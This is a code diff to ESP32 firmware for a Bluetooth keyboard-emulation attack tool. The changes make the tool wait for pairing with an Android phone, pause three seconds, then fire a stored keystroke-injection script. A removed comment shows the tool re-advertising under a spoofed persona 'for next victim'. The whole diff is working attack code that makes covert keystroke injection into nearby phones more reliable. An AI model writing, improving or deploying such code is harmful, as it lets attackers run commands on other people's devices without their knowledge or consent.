@@ -76,6 +76,7 @@ static volatile int       s_connects   = 0;
 static volatile int       s_payloads   = 0;
 static volatile int       s_disconnects = 0;
 static uint16_t           s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+static volatile bool      s_paired      = false;
 static char               s_log_path[80];
 static char               s_script_path[128];
 
@@ -552,13 +553,25 @@ static void bd_exec_script(const char *path)
 static void bd_payload_task(void *arg)
 {
     (void)arg;
-    /* Brief settle — give the host time to discover GATT services */
-    vTaskDelay(pdMS_TO_TICKS(1200));
+    /* Wait for pairing (ENC_CHANGE) before sending keystrokes.
+     * Android drops HID reports sent before encryption is established.
+     * Poll up to 8 s; if the device never pairs, still attempt delivery. */
+    const int PAIR_TIMEOUT_MS = 8000;
+    const int PAIR_POLL_MS    = 100;
+    int waited = 0;
+    while (!s_paired && waited < PAIR_TIMEOUT_MS &&
+           s_active && s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
+        vTaskDelay(pdMS_TO_TICKS(PAIR_POLL_MS));
+        waited += PAIR_POLL_MS;
+    }
 
     if (!s_active || s_conn_handle == BLE_HS_CONN_HANDLE_NONE) {
         vTaskDelete(NULL);
         return;
     }
+
+    /* Post-pair settle: allow Android's keyboard setup dialog to dismiss */
+    vTaskDelay(pdMS_TO_TICKS(3000));
 
     s_payloads++;
 
@@ -738,18 +751,19 @@ static int bd_gap_cb(struct ble_gap_event *event, void *arg)
     case BLE_GAP_EVENT_CONNECT:
         if (event->connect.status == 0) {
             s_conn_handle = event->connect.conn_handle;
+            s_paired      = false;
             s_connects++;
             if (ble_gap_conn_find(s_conn_handle, &desc) == 0)
                 bd_addr_str(desc.peer_ota_addr.val, addr);
             bd_log("connect", addr, NULL);
             ESP_LOGI(TAG, "Connected: %s", addr);
-            /* Launch payload task */
             xTaskCreate(bd_payload_task, "bd_payload", 4096, NULL, 5, NULL);
         }
         break;
 
     case BLE_GAP_EVENT_DISCONNECT:
         s_disconnects++;
+        s_paired = false;
         bd_addr_str(event->disconnect.conn.peer_ota_addr.val, addr);
         {
             char kv[32];
@@ -760,11 +774,14 @@ static int bd_gap_cb(struct ble_gap_event *event, void *arg)
         ESP_LOGI(TAG, "Disconnected: %s reason=%d", addr, event->disconnect.reason);
         s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
         s_led_state   = 0;
-        /* Re-advertise for next victim */
         if (s_active) bd_ext_adv_start(s_persona);
         break;
 
     case BLE_GAP_EVENT_ENC_CHANGE:
+        if (event->enc_change.status == 0) {
+            s_paired = true;
+            ESP_LOGI(TAG, "Paired (enc ok) — script will fire in 3 s");
+        }
         if (ble_gap_conn_find(event->enc_change.conn_handle, &desc) == 0)
             bd_addr_str(desc.peer_ota_addr.val, addr);
         {
